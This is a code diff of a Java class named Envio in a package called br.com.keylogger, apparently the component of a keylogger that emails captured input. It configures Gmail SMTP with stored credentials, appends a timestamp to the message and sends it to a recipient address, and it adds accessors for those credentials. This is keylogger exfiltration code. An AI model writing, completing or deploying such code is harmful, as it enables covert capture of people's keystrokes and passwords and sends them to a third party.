@@ -1,5 +1,7 @@
 package br.com.keylogger;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.Properties;
 
 import javax.mail.Address;
@@ -20,12 +22,24 @@ public class Envio implements EmailIF, Observer {
 	private String email;
 	private String password;
 	private String destinatario;
+	private Date data;
+	private SimpleDateFormat sdf;
 	
 	public Envio(Subject subject, String email, String password, String destinatario) {
 		this.subject = subject;
 		this.email = email;
 		this.password = password;
 		this.destinatario = destinatario;
+		this.props = new Properties();
+		props.put("mail.smtp.host", "smtp.gmail.com");
+        props.put("mail.smtp.socketFactory.port", "465");
+        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
+        props.put("mail.smtp.auth", "true");
+        props.put("mail.smtp.port", "465");
+	}
+	
+	public Envio(Subject subject) {
+		this.subject = subject;
 		this.props = new Properties();
 		props.put("mail.smtp.host", "smtp.gmail.com");
         props.put("mail.smtp.socketFactory.port", "465");
@@ -41,9 +55,11 @@ public class Envio implements EmailIF, Observer {
 				return new PasswordAuthentication(email, password);
 			}
 		});
-		
+		this.data = new Date();
+		this.sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss");
+		mensagem += "\n" + this.sdf.format(this.data);
 		this.session.setDebug(false);
-		JOptionPane.showMessageDialog(null, "ENVIANDO...");
+		JOptionPane.showMessageDialog(null, "ENVIANDO...\n"+mensagem);
 		try {
 			this.message = new MimeMessage(this.session);
 			this.message.setFrom(new InternetAddress(this.email));
@@ -59,6 +75,30 @@ public class Envio implements EmailIF, Observer {
 		} catch(MessagingException e) {
 			throw new RuntimeException(e);
 		}
+	}
+	
+	public String getEmail() {
+		return email;
+	}
+
+	public void setEmail(String email) {
+		this.email = email;
+	}
+
+	public String getPassword() {
+		return password;
+	}
+
+	public void setPassword(String password) {
+		this.password = password;
+	}
+
+	public String getDestinatario() {
+		return destinatario;
+	}
+
+	public void setDestinatario(String destinatario) {
+		this.destinatario = destinatario;
 	}
 
 	@Override
